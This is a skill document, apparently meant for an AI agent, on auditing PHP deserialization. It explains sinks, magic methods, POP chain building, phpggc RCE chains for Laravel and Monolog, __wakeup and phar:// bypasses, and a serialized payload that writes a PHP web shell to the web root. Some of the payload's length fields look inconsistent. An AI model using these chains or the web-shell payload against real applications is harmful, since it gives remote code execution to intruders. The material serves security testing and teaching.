---
name: php-serialization-audit
description: "PHP object injection auditing: identifying unserialize sinks, magic method chains, and building POP gadgets. Use this skill when a PHP application unserializes user input."
---

# PHP Serialization

## Overview

`unserialize($input)` instantiates objects and triggers `__wakeup`/`__destruct`. A POP (property-oriented programming) chain turns that into a sink call.

## Find the sink

```bash
grep -rn "unserialize(" app/
# indirect: session handling, cache backends, cookie parsing
grep -rn "session_decode\|igbinary_unserialize" app/
```

## Serialized format

```
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
```

Types: `s` string, `i` int, `b` bool, `a` array, `O` object, `N` null, `d` double.

## Magic methods

| Method | Trigger |
|---|---|
| `__wakeup` | on unserialize |
| `__destruct` | on garbage collection |
| `__toString` | when cast to string |
| `__call` | on undefined method |
| `__get` | on undefined property read |
| `__invoke` | when called as a function |

## Building a chain

1. Find a class with `__destruct` calling a sink (`system`, `file_put_contents`, `eval`).
2. Walk backwards: which property controls the argument?
3. Find a class whose `__wakeup`/`__toString` sets that property.
4. Combine with the real class hierarchy.

```php
class Logger {
    public $file;
    public $msg;
    public function __destruct() { file_put_contents($this->file, $this->msg); }
}
echo serialize(new Logger());
```

```php
$p = 'O:6:"Logger":2:{s:4:"file";s:18:"/var/www/html/s.php";s:3:"msg";s:18:"<?php system($_GET[c]);";}';
file_put_contents("/tmp/payload", $p);
```

## phpggc

```bash
phpggc -l                       # list chains
phpggc Laravel/RCE1 system id
phpggc Monolog/RCE1 exec id -b  # base64
```

## Bypass filters

- `__wakeup` bypass: `O:4:"User":3:{...}` with a property count mismatch (PHP < 7.0.6).
- `C:` (custom serialize) handler abuse.
- `Serializable` interface `unserialize()` method.
- Phar deserialization: `phar://` triggers unserialize on metadata.

## Phar trick

Many file functions accept `phar://`:

```php
file_exists("phar://uploads/evil.jpg/a");
```

The phar metadata is unserialized — no `unserialize()` call needed in the app.

## Pitfalls

- Version differences break chains (`__wakeup` bypass patched in 7.0.6+).
- A chain requires the target class to be autoloadable.
- PHP 8 changed some magic method semantics.

## Verification

The payload must produce the sink effect (file written, command output) on the target.
